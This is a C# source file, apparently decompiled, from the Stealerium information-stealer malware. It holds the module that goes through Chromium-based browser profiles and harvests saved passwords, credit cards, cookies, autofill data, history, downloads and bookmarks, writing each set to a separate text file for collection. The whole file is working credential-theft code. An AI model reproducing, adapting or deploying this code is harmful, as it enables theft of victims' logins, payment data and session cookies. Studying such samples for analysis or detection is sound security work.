using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		if (!Directory.Exists(sSavePath))
		{
			Directory.CreateDirectory(sSavePath);
		}
		string[] sChromiumPswPaths = Paths.SChromiumPswPaths;
		foreach (string text in sChromiumPswPaths)
		{
			string path = ((!text.Contains("Opera Software")) ? (Paths.Lappdata + text) : (Paths.Appdata + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string obj in directories)
				{
					string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
					Directory.CreateDirectory(text2);
					List<CreditCard> cCc = CreditCards.Get(obj + "\\Web Data");
					List<Password> pPasswords = Passwords.Get(obj + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(obj + "\\Cookies");
					List<Site> sHistory = History.Get(obj + "\\History");
					List<Site> sHistory2 = Downloads.Get(obj + "\\History");
					List<AutoFill> aFills = Autofill.Get(obj + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(obj + "\\Bookmarks");
					CBrowserUtils.WriteCreditCards(cCc, text2 + "\\CreditCards.txt");
					CBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
					CBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
					CBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
					CBrowserUtils.WriteHistory(sHistory2, text2 + "\\Downloads.txt");
					CBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
					CBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
